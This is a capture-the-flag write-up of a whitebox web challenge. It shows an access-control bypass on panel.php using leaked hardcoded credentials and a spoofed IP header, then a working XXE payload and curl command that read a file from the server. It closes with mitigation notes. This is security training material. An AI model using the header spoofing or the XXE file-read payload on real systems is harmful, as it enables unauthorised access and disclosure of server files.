## WhiteBox Penetration Test – Internal Web Application

This challenge demonstrates the XML external entity vulnerability that allows an attacker to interfere with an application's processing of XML data.

Challenge Credit: Devnull X ZedBounty

### Scenario

Vivacell is days away from launching their flagship bio-tech platform: Everything looks perferct on paper, but engineers keep encountering anomalies that vanish before they can be logged. Management call it a glitch. The lead developer calls it "impossible." Youve been quietly invited to validate the system before it goes live. No headlines. No panic. Just you,the code, and whatever its hiding.

### Tools Used
- Burp Suite
- kali linux (OS)
- Curl
- Mozilla Firefox
- XML Payloads (Payloadallthings)
- DomDocument analysis

**Environment**

![Screenshot_2025-05-05_13_36_35](https://github.com/user-attachments/assets/f062c120-325b-47f0-ab35-82652efe44c7)

 
 **Configuration Files (zip file)**

 Since its a whitebox test,configuration files where provided in a zip file.
 
  
![c](https://github.com/user-attachments/assets/d87c1c3b-c666-4a45-86d9-9b3cccfd0ad1)



  *Panel.php looks like an interesting file*


### Key Findings

**1. Access Control bypass**

Upon trying to access panel.php on the live web server our access was denied. 

Something already smells vulnerable.....lol

![Screenshot_2025-05-05_15_56_47](https://github.com/user-attachments/assets/3be39ff4-0084-47eb-b2a5-064c451f87ef)

  
**Lets open up the panel.php file**

  ![cred](https://github.com/user-attachments/assets/0e8ee05e-73ec-4911-9893-8ba698b11f81)

  
- Hardcoded credentials discovered via *panel.php* file.....bullseye!
  
- We have admin username and password
  
- A whole ip address and what looks like a vpn server name....hmmm

**Lets take out the big guns now......Burpsuite!**

  --> Intercept request with proxy
  
  --> Insert credentials and spoofed IP in HTTP Header.
  
  --> forward request

  
  ![Screenshot_2025-05-05_14_46_34](https://github.com/user-attachments/assets/878e17fb-3584-49c0-b823-fd9ab6d8b948)
  

  - Panel.php is now accessible
    
    ![Screenshot_2025-05-05_14_12_23](https://github.com/user-attachments/assets/992309f8-18b6-4d8f-baff-757cc84638d8)
    

    *......Sweeeeet!*

**2. Vulnerability Discovery (XXE)**

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. - Portswigger

Whats happening is that the server is able to recieve external data (In the form of XML) and processes this data without proper handling hence the parser expands the input and reveals files on the server.

**Classification:** XML External Entity (XXE) Injection

**Impact:** High/severe 

 --> Send request to Burp repeater

 --> Change method from GET to POST

 --> Content type to application/xml

 --> Insert test payload in message body 
 
> payload from PayloadsAllThings [View Payload](https://github.com/Mumbi-Sec/PayloadsAllThings/blob/b9e847decb60d436f632a33f48f68fabaa324900/XXE%20Injection/Files/Classic%20XXE%20-%20etc%20passwd.xml)
 



![Screenshot_2025-05-05_14_24_41](https://github.com/user-attachments/assets/2139a878-a07a-4ecf-9284-3390de2de149)


 *Look at this server.....so..**responsive** lol*

 **3. Exploit**
 
 The panel.php endpoint accepts XML input via POST with the header Content-Type: application/xml. 
 
 --> Open Burp Repeater

 --> Change the request method GET to POST

    POST /panel.php?username=v1v4c3ll4dm1n&password=v1va_la_v1da@123 HTTP/1.1
 
    Host: challenge.zedbounty.com

    X-VIVACELL-VPN: 41.18.611.104

    Content-Type: application/xml

    Connection: close

--> Paste the payload in the message body

```xml &lt;?
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<data>
    <health>&xxe;</health>
    <temperature>420</temperature>
    <pressure>1337</pressure>
    <control_rods>Lowered</control_rods>
    <radiation_level>5.4</radiation_level>
    <coolant_level>87</coolant_level>
    <power_input>900</power_input>
    <emergency_shutdown>false</emergency_shutdown>
</data>
```
---> How it was sent in Burp

![Screenshot_2025-05-06_14_21_15](https://github.com/user-attachments/assets/e4936b49-0fe0-4a9a-b891-45a23315f087)


--> Check The response tab

*Viola.......Flag Captured: **ZB{xx3_ch3mic4l_r3act1on}***


**Alternative:**

you can also use curl by pasting your payload in a file, then use the following command on your terminal:

       curl -X POST "https://challenge.zedbounty.com/panel.php?username=v1v4c3ll4dm1n&password=v1va_la_v1da@123" -H "X-VIVACELL-VPN: 41.18.611.104" -H "Content-Type: application/xml" --data-binary @payloadfile.xml



### 4. Mitigation

- Validate or sanitize incoming XML payloads.

- Disable entity Loading.

- Restrict LIBXML_NOENT usage.

### 5. Lessons Learned

- Bypassing directory access controls using HTTP Header requests.
  
- DOMDocument::loadXML() parser when used with LIBXML_NOENT can expose sensitive files on the web server

- Never trust user supplied headers to validate ip addresses!

### Thank you.....

## Credits and sources

https://zedbounty.com/

https://portswigger.net/web-security/xxe
